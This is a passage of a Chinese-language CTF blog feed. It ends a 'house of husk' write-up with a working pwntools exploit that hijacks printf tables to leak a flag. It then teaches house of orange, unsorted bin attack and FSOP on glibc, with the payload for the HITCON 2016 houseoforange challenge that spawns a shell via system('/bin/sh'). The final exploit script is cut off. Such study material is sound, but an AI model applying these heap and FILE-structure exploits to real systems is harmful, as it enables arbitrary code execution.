(&amp;format, &amp;spec-&gt;info) != <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在溢出伪造数据时，需要控制 <code>__printf_modifier_table</code> 为 <code>NULL</code> 不然会触发一些别的条件的判断导致程序崩溃或者执行流走偏，这个 <code>__printf_modifier_table</code> 位于 <code>__printf_function_table</code> 地址加 <code>8</code> 的位置</p><p>满足上面的部分就可以成功在 <code>*__printf_arginfo_table[spec-&gt;info.spec]</code> 这个位置来劫持执行流，我们将此处控制为 <code>__stack_chk_fail()</code> ，该函数执行时，会打印出 <code>__libc_argv[0]</code> 指向的字符串</p><p>先确定 <code>__libc_argv[0]</code> 的地址（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141310775.png" alt="image-20230214131007737"></p><p>然后需要向这个地址里写入一个指向 <code>flag</code> 地址的指针。</p><p>我布置的情况如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141311225.png" alt="image-20230214131134190"></p><p>上述布局全部完成，执行 <code>printf((__int64)&quot;Hi, %s. Bye.\n&quot;, name);</code> 时就可以将 <code>flag</code> 打印出来</p><h4 id="EXP">EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=load(<span class="string">&#x27;readme_revenge&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x45ad0f</span>)</span><br><span class="line">leak_flag=<span class="number">0x4359B0</span></span><br><span class="line">flag_addr=<span class="number">0x6B4040</span></span><br><span class="line">payload=p64(flag_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x598</span></span><br><span class="line">payload+=p64(<span class="number">0x6B73E0</span>)<span class="comment">#__libc_argv[0]</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x640</span>-<span class="number">0x5a0</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#__printf_function_table</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#__printf_modifier_table</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">payload+=p64(<span class="number">0x6b7aa8</span>)<span class="comment">#__printf_arginfo_table</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">0x72</span></span><br><span class="line">payload+=p64(leak_flag)<span class="comment">#__stack_chk_fail</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141317933.png" alt="image-20230214131708408"></p><h3 id="总结">总结</h3><p>没想到日常使用的 <code>printf</code> 函数也是可以劫持执行流的。但需要注意该手法的利用条件其实有些苛刻，而且没有办法控制参数，只能劫持到 <code>one_gadget</code> 或者不需要参数的地址。所以除了少部分的题目外，该手法并不是一个最优的选择，但通过 <code>house of husk</code> 也让我了解到了 <code>printf</code> 函数中对于自定义格式化字符的处理流程以及可劫持执行流的位置，正所谓技多不压身，<code>house of husk</code> 确实是一个有趣的攻击思路</p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> house of husk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结</title>
      <link href="/posts/f0d8c344.html"/>
      <url>/posts/f0d8c344.html</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面：">写在前面：</h2><p>通过学习house of orange，又对unsorted bin attack以及FSOP有了一些新的理解。说到底house of orange本身的效果很小，但加上两个组合拳(unsorted bin attack和FSOP)则威力就会变的很大。这篇文章我将对这三种手法都详细记录一下原理和利用方式，最后放上例题。</p><h2 id="总结：">总结：</h2><p>在此，先对house of orange以及后续整体的流程简单总结一下：</p><blockquote><p>最开始我们先用house of orange将原本的top chunk放入unsorted bin中。然后利用溢出篡改unsorted bin里的chunk的size为0x60，同时还篡改了该chunk的bk指针。最后我们申请一个任意大小的chunk，开始触发攻击链，首先ptmalloc会先遍历unsorted bin(此时前面已经遍历了fast bin和small bin)，ptmalloc的策略是一边遍历unsorted bin尝试寻找和自己需要的size完全相同的chunk，一边给不符合条件的chunk分下类(也就是放到small bin或者large bin)。在分类的时候就会将在unsorted bin上的chunk给脱链，然后触发unsorted bin attack，此时的IO_list_all被写入main_arena+88的地址，然后发现chunk的size为0x60，于是给划分到了small bin里。而_IO_2_1_stderr的_chain字段正好落在了small bin[0x60]上，于是乎我们就控制了_IO_2_1_stdout里的内容。然后为了接下来的FSOP攻击做好布局(控制stdout结构体其实就是堆溢出来编辑最开始进入的那个unsorted bin里的堆块内容)。然后ptmalloc还会继续去遍历unsorted bin(因为unsorted bin被unsorted bin attack攻击破坏的原因，让ptmalloc以为unsorted bin还有chunk)，但是此时的victim(也就是当前unsorted bin准备链出的chunk)已经是最开始覆盖unsorted bin bk的值了(也就是IO_list_all-0x10)。然此时的victim-&gt;size为0，没有通过检查，于是就触发了malloc_printerr，调用了abort，最终刷新所有文件流的时候，到stdout结构体时触发了FSOP，成功获取shell。</p></blockquote><p>其实整体流程就是把后续的unsorted bin attack和FSOP运用到了极致。</p><h2 id="house-of-orange">house of orange</h2><blockquote><p>什么是house of orange?</p><p>house of orange该攻击手法是在我们没有free函数的情况下，来获得一个在unsorted bin中的堆块。house of orange到这里就结束了，但之后还会利用其他的手法来拿到shell。</p><p>原理：</p><p>如果我们申请的堆块大小大于了top chunk size的话，那么就会将原来的top chunk放入unsorted bin中，然后再映射或者扩展一个新的top chunk出来。</p><p>利用过程：</p><p>1、先利用溢出等方式进行篡改top chunk的size(具体要求的话下面再说)</p><p>2、然后申请一个大于top chunk的size</p></blockquote><p>然后主要说一下我们具体需要绕过的检查</p><p>主要就是下面两个断言(如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;<span class="comment">//原本old top chunk的地址</span></span><br><span class="line">old_size = chunksize (old_top);<span class="comment">//原本old top chunk的size</span></span><br><span class="line">old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="comment">//old top chunk的地址加上其size</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果是第一次调用该函数，那么top chunk是没有被初始化的，并且其size自然为0 ，我们利用的时候，这里肯定不成立，暂且不用管</p><p>如果上面这个条件不成立的话，就需要保证原本old top chunk的size大于MINSIZE,还需要保证原本old top chunk的prev_inuse位是1,并且原本old top chunk的地址加上其size之后的地址要与页对齐 也就是address&amp;0xfff=0x000。最后old chunk的size必须要小于我们申请的堆块大小加上MINSIZE。</p><p>最后就是要注意如果我们申请的堆块大于了0x20000，那么将会是mmap映射出来的内存，并非是扩展top chunk了。</p><p>总结下，我们需要绕过检查所需要构造的值：</p><p>old_top_size(我们通过溢出修改)     nb（我们申请的堆块大小）</p><blockquote><p>MINSIZE&lt;old_top_size&lt;nb+MINSIZE</p><p>old_top_size的prev_size位是1</p><p>(old_top_size+old_top)&amp;0xfff=0x000</p><p>nb&lt;0x20000</p></blockquote><p>构造完成后，我们申请出来nb大小的堆块，那么top chunk就会进入到unsorted bin中。</p><p><img src="../img/2706180-20220920201613897-1312734603.png" alt=""></p><p><img src="../img/2706180-20220920201634834-439114022.png" alt=""></p><p>此时就完成了攻击前的准备阶段，而接下来需要先介绍一下unsorted bin attack。</p><h2 id="unsorted-bin-attack">unsorted bin attack</h2><p>unsorted bin attack这个攻击手法最终可以实现往一个指定地址里写入一个很大的数据（main_arena+88或main_arena+96）</p><p>关于这个手法的学习，必须要搞清楚两件事，不然理解起来挺懵的。</p><p>第一、从unsorted bin中取堆块的时候，是从尾部取的堆块。</p><p><img src="../img/2706180-20220920201921204-253619976.png" alt=""></p><p>第二、把上述的情况，画成图，应该是下面这个样子</p><p><img src="../img/2706180-20220920202016161-564133422.png" alt=""></p><p>知道上面这两件事之后，下面理解起来就很容易了。</p><p>就是当从unsorted bin中拿取最后一个堆块时（unsorted bin中堆块是从最后一个取的，跟fastbin和tcachebin还不一样），会触发下面这部分的操作。<strong>(下面这部分操作是在遍历unsorted bin给其堆块分类到small bin或者large bin中完成的，也就是说我们只要覆写了unsorted bin中chunk的bk指针，在下一次遍历unsorted bin的时候，都可以让bk+0x10的位置写入main_arena+88/96的地址(无论nb是否等于size)，但是如果申请的大小不等同于原本位于unsorted bin中的堆块，就会在后续的检查中导致程序崩溃。)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">bck = victim-&gt;bk</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure><p>如果看着代码挺懵，我就简单分析一下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">这个就是说把main_arena（这里的main_arena我的指的是上图的那个main_arena bins[0,1]这个块)的bk指针指向的内容（也就是chunk3的地址）给victim</span><br><span class="line">换言之，这行代码的意思就是说victim就是chunk3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk</span><br><span class="line">这个就是把chunk3的bk指针指向的内容（也就是chunk2)给bck</span><br><span class="line">换言之，这行代码的意思就是说bck就是chunk2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">这个就是把现在的chunk2地址给main_arena的bk指针</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br><span class="line">这个就是把main_arena的地址给bck（也就是chunk2)的fd指针</span><br></pre></td></tr></table></figure><p>而这四步之后，也就将chunk3从这个双向链表中踢了出去。</p><p>这四步中，我们可以从第二步进行攻击，如果我们可以利用溢出来伪造这个bck(也就是victim-&gt;bk，<strong>大白话就是用溢出unsorted bin中的尾部的chunk的bk指针（fd指针无所谓）</strong>），这就意味着我们可以将unsorted_chunks (av)(这个也就是main_arena+88/96的地址)写入到我们伪造的bck-&gt;fd(也就是bck+0x10)中。<strong>如果我们将伪造的地址先-0x10，那么最后这个伪造的地址就会被写入main_arena+88或main_arena+96的地址。<strong>伪造之后，我们从unsorted bin中将堆块申请出来</strong>(如果篡改的这个位于unsorted bin中的堆块size为0x900，那就必须要申请0x900堆块，不能小于(因为这样会将堆块进行切割)也不能大于(因为大于的话就不会从unsorted bin中拿堆块了))，当把0x900的堆块申请出来时，就完成了地址写入。</strong></p><p>听起来感觉挺秀，但是仔细一想似乎没啥用，好像这只能把一个很大的数值写到我们指定的地点（因此这个攻击也是一个辅助的攻击手段，还需要配合其他攻击才能发挥出来相当大的效果）。</p><blockquote><p><strong>注意：由于执行完unsorted bin attack 后的chunk2已经变成了一个libc中的地址（应该是main_arena+88的地址），接下来再从unsorted bin中申请堆块时，执行bck-&gt;fd这步试图往libc这个不可写的地址写入数据，而导致程序崩溃。<u>所以unosrtedbin attack之后，无法再从unsorted bin中申请堆块了</u></strong></p></blockquote><p>配合刚才的house of orange攻击后产生的位于unsorted bin中的堆块，如果我们能够覆盖这个位于unsorted bin中堆块的bk指针，那么我们就能够往任意地址写一个main_arena+88(96)。而我们要去通过unsorted bin attack向_IO_list_all写入这个地址main_arena+88,然后去打一个FSOP。</p><h2 id="FSOP">FSOP:</h2><p>FSOP的核心是去篡改_IO_list_all和_chain，来劫持IO_FILE结构体。让IO_FILE结构体落在我们可控的内存上。然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow</p><p>而前面提到了，我们将IO_FILE结构体落在我们可控的内存上，这就意味着我们是可以控制vtable的，<strong>我们将vtable中的_IO_overflow函数地址改成system地址即可</strong>，而这个函数的第一个参数就是IO_FILE结构体的地址，因此我们让IO_FILE结构体中的flags成员为/bin/sh字符串，那么当<strong>执行exit函数</strong>或者<strong>libc执行abort流程时</strong>或者<strong>程序从main函数返回时</strong>触发了_IO_flush_all_lockp即可拿到shell</p><p>下面是链表的正常结构</p><p><img src="../img/2706180-20220920202054550-1462970818.png" alt=""></p><p>下面是FSOP的布局，首先篡改_IO_list_all为main_arena+88这个地址(因为这片内存是不可控的)，chain字段是首地址加上0x68偏移得到的。因此chain字段决定了下一个IO_FILE结构体的地址为main_arena+88+0x68，这个地址恰好是smallbin中size为0x60的数组，如果我们能将一个chunk放到这个small bin中size为0x60的链上，那么篡改_IO_list_all为main_arena+88这个地址后，small bin中的chunk就是IO_FILE结构体了，将其申请出来后，我们就可以控制这块内存了，从而伪造vtable字段进行布局最终拿到shell。</p><p><img src="../img/2706180-20220920202121457-1221438245.png" alt=""></p><p>下面说一下布局时需要篡改哪些字段来绕过if的检查。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>观察上面的代码发现，如果我们要想执行_IO_OVERFLOW (fp, EOF)就需要让最外面的if中&amp;&amp;前面的那部分成立，而这部分中间又用了一个||来连接两个条件，分别是<code>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>和<code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base</code><br>这两部分条件任意满足一处即可，前面那个部分的条件满足起来很省事，我们只需要让mode=0,_IO_write_ptr=1,_IO_write_base=0即可(这仨值改成其他的也行，只需要满足条件即可)，这样就会触发_IO_OVERFLOW。</p><p><strong>注意：</strong></p><p>为什么house of orange后打FSOP成功的概率是1/2？</p><p>由于触发了_IO_flush_all_lockp函数，会根据_IO_list_all和chain字段来去依次遍历链表上的每个结构体，在我们整体布局完成后，第一个结构体就是从main_arena+88开始。而第一个结构体的mode字段是main_arena+88+0xc0处的数据决定的(如下图)。<strong>mode字段是四字节</strong></p><p><img src="../img/2706180-20220920202140803-372395368.png" alt=""></p><p>而上面这个地址由于libc地址随机化 导致这个值的补码可能是正也可能是负，也就是说这四个字节可能是0到0xffffffff之间的任意值，但是如果大于0x7fffffff的话该值就为负，小于则为正。这个0xffffffff/2的值 正好就是最大的正值为0x7fffffff 所以刚好_mode字段为负的概率是1/2</p><p><strong>那为啥非要这个mode字段为负才行呢？</strong></p><p>因为倘若mode为正，则上面if检查的这部分<code>fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 就会成立。这样就会触发_IO_OVERFLOW函数(可此时在遍历第一个IO_FILE结构体)，但是我们的布局是在第二个IO_FILE结构体上，我们需要的是遍历到第二个IO_FILE结构体的时候触发 IO_OVERFLOW函数。如果遍历第一个结构体时触发了_IO_OVERFLOW函数,程序则会崩溃，因为我们无法控制vtable表项。</p><blockquote><p>house of orange中的函数调用流程为：</p><p>__libc_malloc-&gt;malloc_printerr-&gt;libc_message-&gt;abort-&gt;_IO_flush_all_lockp</p></blockquote><p>IO_FILE结构体：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vtable中的函数指针：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="例题">例题</h2><h3 id="houseoforange-hitcon-2016">houseoforange_hitcon_2016</h3><h4 id="保护策略：">保护策略：</h4><p><img src="../img/2706180-20220920202755893-646421990.png" alt=""></p><h4 id="漏洞所在：">漏洞所在：</h4><p><img src="../img/2706180-20220920202813042-943539521.png" alt=""></p><p>在edit函数中，往堆块里写入数据时，又询问了一次size，因此edit函数中存在堆溢出。</p><p>不过这道题的难点在于题目中没有free函数，这就意味着我们以前的手法几乎无法利用。而house of orange可以去产生一个位于unsorted bin中的堆块。</p><h4 id="利用过程：">利用过程：</h4><h5 id="house-of-orange-v2">house of orange:</h5><p>因此我们这道题先打一个house of orange，做出来一个被释放掉的堆块再说。</p><p>这部分的exp如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_e,d_a,d_s)</span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>调试过程如下：</p><p><img src="../img/2706180-20220920202831416-954761380.png" alt=""></p><p>然后我们申请一个0x1000的堆块，发现top chunk不够用了，就会将旧的top chunk给释放掉(如下)</p><p><img src="../img/image-20221007234332601.png" alt=""></p><h5 id="泄露地址：">泄露地址：</h5><p>此时我们通过打house of orange得到了一个unsorted bin中的堆块，但是为了之后的手法顺利进行，我们还需要拿到一个堆地址和libc地址。而这道题其实还存在一个漏洞，就是忘记在输入函数中输入数据后，给字符串末尾加上\x00了，这就导致了只要让堆块进入unsorted bin中，就会残留fd和bk指针，再次申请的时候即可泄露libc。但是我们还需要堆地址，就需要申请一个largebin size的chunk。</p><p>由于最初遍历unsorted bin的时候，会将其中的堆块分类放入small bin或者large bin中，这样程序中那个大堆块就会被分到large bin中，然后启用fd_nextsize和bk_nextsize指针(堆地址就会残留到这上面)</p><p>从large bin申请出来的chunk上面残留了libc和堆地址，我们执行show函数即可进行泄露</p><p><img src="../img/2706180-20220920202918866-471108266.png" alt=""></p><p>这部分exp如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="unsorted-bin-attack：">unsorted bin attack：</h5><p>正如上文提到的，在house of orange之后，我们需要打unsorted bin attack将main_arena+88/96的地址写入_IO_list_all。 这里利用溢出，直接去修改chunk的bk指针为_IO_list_all-0x10即可(如下图)</p><p><img src="../img/2706180-20220920203032658-408826904.png" alt=""></p><p>这样等到下一次malloc申请堆块的时候，就会将main_arena+88的地址写入_IO_list_all（如下）</p><p><img src="../img/image-20221007234402464.png" alt="image-20221007234402464"></p><p>由于链表头_IO_list_all已经被篡改，就导致了之后的IO_FILE结构体也都被破坏了，我们看下现在链表上第一个的结构体(如下)</p><p><img src="../img/2706180-20220920203059472-1818877916.png" alt=""></p><p>现在的chain字段的地址如下</p><p><img src="../img/2706180-20220920222700976-122227575.png" alt=""></p><p>而这个地址是smallbin中size为0x60的数组的位置，假设我们在smallbin中为0x60的大小的堆块，那我们将堆块申请出来，写入的数据就可以直接控制第二个IO_FILE结构体。让smallbin中出现一个0x60的堆块的方法是提前用edit函数来篡改位于unsorted bin中堆块的size，然后再次调用malloc函数的时候会去遍历各个bins，遍历unsorted bin的时候会将该bins的堆块进行分类(放入small bin或者large bin中)</p><p>因为篡改size为0x60，所以该堆块便会进入small bin中size为0x60的链表中。再次分配出来时，我们即可控制第二个IO_FILE结构体。(如下图，此时是堆块进入了smallbin中，可以发现此时的chain字段已经变成了我们堆块的地址)</p><p><img src="../img/image-20221007234456349.png" alt="image-20221007234456349"></p><h5 id="FSOP：">FSOP：</h5><p>上图的chain字段成功为堆地址，就说明我们已经可以控制下一个的IO_FILE结构体了，下面说一下如何构造各个字段的值来完成FSOP。</p><p>将_flags字段写入/bin/sh</p><p>将 _IO_write_ptr改成0x1</p><p>将 _IO_write_end改成0x0</p><p>将_mode改成0</p><p>将vtable的地址改成&amp;vtable</p><p>然后在vtable字段后再跟16个字节的0最后写上system函数的地址即可。</p><p>布局完成后，结构体中的数据应该如下：</p><p><img src="../img/image-20221007234516300.png" alt="image-20221007234516300"></p><p>然后等执行libc_message的时候会调用abort最后触发_IO_flush_all_lockp，不过在这之前我们已经布局好了IO_FILE结构体中的各个值。最终到_IO_overflow时触发system(“/bin/sh\x00”)获取shell。</p><p>unsorted bin attack和FSOP攻击都是构造数据在一个payload里的。</p><p>payload如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)<span class="comment">#DUMMY finish overflow</span></span><br></pre></td></tr></table></figure><p>总结下这题的整体流程：首先利用溢出来篡改top chunk的size字段，申请一个大的size来打一个house of orange让堆块进入unsorted bin中，然后申请出来的size要属于large bin的范围这样就可以同时泄露出libc和堆地址了。此时我们的unsorted bin中依然有堆块，我们去利用溢出打一个unsorted bin attack，将_IO_list_all中写入main_arena+88，这就已经控制了第一个IO_FILE结构体地址了，但是里面的字段我们控制不了，不过该结构体的chain字段地址位于small bin中size为0x60的数组，我们将unsorted bin中这个堆块的size用溢出改为0x61，这样再次申请出来后我们就可以控制第二个IO_FILE结构体了，布置好需要绕过检查的数据最后打一个FSOP即可获取shell。</p><h5 id="补充：">补充：</h5><p>house of orange利用过程中，最后程序触发abort刷新流的原因是在unsorted bin attack打完之后 在第二次遍历unsorted bin给堆块分类的时候 由于unsorted bin已经被破坏，然后victim已经是一个libc地址(在下面的这张图片该地址是io_list_all-0x10的地址，这个地址也就是我们篡改bk指针的值)，而其对应的size位是0，从而没有通过检查(如下)，最终触发了abort</p><p><img src="../img/image-20221019205258333.png" alt="image-20221019205258333"></p><p><img src="../img/image-20221019205404478.png" alt="image-20221019205404478"></p><h4 id="EXP：">EXP：</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x13FD</span></span><br><span class="line">d_e=<span class="number">0x1415</span></span><br><span class="line">d_s=<span class="number">0x1409</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span 